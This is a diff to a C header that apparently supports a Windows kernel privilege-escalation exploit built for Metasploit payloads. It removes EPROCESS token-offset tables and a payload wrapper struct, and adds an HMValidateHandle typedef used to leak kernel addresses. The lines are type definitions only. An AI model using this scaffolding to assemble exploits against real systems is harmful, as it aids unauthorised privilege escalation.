@@ -7,28 +7,6 @@
 typedef long NTSTATUS;
 #endif
 
-typedef struct _EPROCESS_OFFSETS {
-	WORD ActiveProcessLinks;
-	WORD Token;
-	WORD UniqueProcessId;
-} EPROCESS_OFFSETS;
-typedef EPROCESS_OFFSETS* PEPROCESS_OFFSETS;
-
-const static EPROCESS_OFFSETS g_EprocessOffsetsWin10v1803 = { 0x2f0, 0x360, 0x2e8 }; /* Windows 10 v1803 - v1909 */
-const static EPROCESS_OFFSETS g_EprocessOffsetsWin10v2004 = { 0x448, 0x4b8, 0x440 }; /* Windows 10 v2004 - v20H2 */
-
-/*
- * This struct makes the exploit compatible with a Metasploit payload of an arbitrary as constructed using something like:
- * 
- * encoded_payload = payload.encoded
- * [encoded_payload.length].pack('I<') + encoded_payload
- */
-typedef struct _MSF_PAYLOAD {
-	DWORD  dwSize;
-	CHAR  cPayloadData[];
-} MSF_PAYLOAD;
-typedef MSF_PAYLOAD* PMSF_PAYLOAD;
-
 // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/handle_table_entry.htm?ts=0,80
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
 	USHORT     UniqueProcessId;
@@ -98,3 +76,6 @@ typedef VOID(__stdcall* fRtlGetNtVersionNumbers)(
 	DWORD* MinorVersion,
 	DWORD* BuildNumber
 	);
+
+#define TYPE_WINDOW 1
+typedef PVOID(__stdcall* fHMValidateHandle)(HANDLE hHandle, DWORD dwType);
